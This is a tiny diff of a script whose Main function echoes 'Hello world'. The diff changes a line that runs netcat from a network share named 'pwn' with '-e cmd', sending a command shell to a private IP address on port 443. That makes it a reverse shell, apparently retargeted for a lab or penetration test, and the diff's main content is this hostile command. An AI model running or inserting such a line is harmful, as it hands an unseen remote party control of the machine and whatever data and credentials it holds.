@@ -15,5 +15,5 @@ function Main
 
     echo "Hello world"
 
-    cmd /c \\192.168.6.128\pwn\nc.exe -e cmd 192.168.6.128 443
+    cmd /c \\192.168.0.4\pwn\nc.exe -e cmd 192.168.0.4 443
 }
